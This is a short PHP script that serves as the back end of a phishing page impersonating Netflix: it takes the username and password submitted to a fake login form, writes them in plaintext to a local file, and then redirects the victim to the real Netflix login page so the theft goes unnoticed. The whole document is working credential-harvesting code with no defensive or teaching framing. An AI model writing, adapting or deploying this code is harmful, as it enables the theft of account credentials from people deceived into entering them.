<?php
// Check if the form was submitted
if(isset($_POST['username']) && isset($_POST['password'])){
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Save the credentials to a file safely
    $file = fopen("credentials.txt", "a");
    fwrite($file, "Username: ".$username." | Password: ".$password."\n");
    fclose($file);

    // Redirect to real Netflix page (optional)
    header("Location: https://www.netflix.com/login");
    exit();
}
?>￼Enter
